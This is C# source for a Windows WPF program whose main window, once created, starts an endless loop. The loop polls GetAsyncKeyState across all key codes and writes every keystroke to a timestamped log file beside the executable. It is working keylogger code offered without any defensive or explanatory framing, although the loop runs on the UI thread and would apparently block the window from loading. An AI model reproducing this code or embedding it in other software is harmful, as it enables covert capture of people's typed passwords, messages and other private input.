using System;
using System.Windows;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

public partial class MainWindow : Window
{
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    public MainWindow()
    {
        InitializeComponent();
        LogKeys();
    }

    static void LogKeys()
    {
        string logPath = 
        (
            System.Windows.Forms.Application.StartupPath + 
            @"\log " + 
            DateTime.Now.Year + "-" +
            DateTime.Now.Month + "-" +
            DateTime.Now.Day + "_@" +
            DateTime.Now.TimeOfDay.Hours + "-" + 
            DateTime.Now.TimeOfDay.Minutes + "-" + 
            DateTime.Now.TimeOfDay.Seconds + 
            ".txt"
        );

        if (!File.Exists(logPath))
        {
            File.CreateText(logPath).Dispose();
        }

        KeysConverter converter = new KeysConverter();

        while (true)
        {
            Thread.Sleep(10);

            for (Int32 i = 0; i < 255; i++)
            {
                int key = GetAsyncKeyState(i);

                if (key == 1 || key == -32767)
                {
                    using (StreamWriter sw = File.AppendText(logPath))
                    {
                        sw.WriteLine(converter.ConvertToString(i));
                        sw.Dispose();
                    }
                }
            }
        }
    }
}